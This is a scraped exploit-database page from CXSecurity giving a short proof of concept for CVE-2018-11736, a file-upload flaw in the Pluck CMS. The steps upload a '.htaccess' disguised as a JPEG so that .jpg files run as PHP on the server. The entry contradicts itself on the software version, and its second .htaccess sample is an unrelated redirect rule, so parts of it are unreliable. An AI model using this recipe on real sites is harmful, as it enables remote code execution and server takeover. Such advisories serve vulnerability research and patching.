---
title: Pluck 4.7.7-dev2  PHP Code Execution
url: https://cxsecurity.com/issue/WLB-2025120012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-14
fetch_date: 2025-12-15T03:27:05.795826
---

# Pluck 4.7.7-dev2  PHP Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Pluck 4.7.7-dev2 PHP Code Execution** **2025.12.14**  Credit:  **[CodeSecLab](https://cxsecurity.com/author/CodeSecLab/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2018-11736](https://cxsecurity.com/cveshow/CVE-2018-11736/ "Click to see CVE-2018-11736")**  CWE: **[CWE-434](https://cxsecurity.com/cwe/CWE-434 "CWE-434")**  CVSS Base Score: **7.5/10**  Impact Subscore: **6.4/10**  Exploitability Subscore: **10/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Partial**  Integrity impact: **Partial**  Availability impact: **Partial** | |

# Exploit Title: Pluck 4.7.7-dev2 - PHP Code Execution
# Date: 2024-10-26
# Exploit Author: CodeSecLab
# Vendor Homepage: https://github.com/pluck-cms/pluck
# Software Link: https://github.com/pluck-cms/pluck
# Version: 4.74-dev5
# Tested on: Ubuntu Windows
# CVE : CVE-2018-11736
PoC:
1）
1. Log in to the Pluck admin panel.\n
2. Navigate to the 'Manage Images' section at http://pluck1/admin.php?action=images.\n
3. Upload a file named '.htaccess' with the content-type 'image/jpeg' containing 'AddType application/x-httpd-php .jpg'.\n
4. Access the target directory (e.g., http://pluck1/images/test.jpg) to execute PHP code with the .jpg extension.
2)
.htaccess content:
RewriteEngine On
RewriteRule .\* http://www.baidu.com/ [R,L]
[Replace Your Domain Name]

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top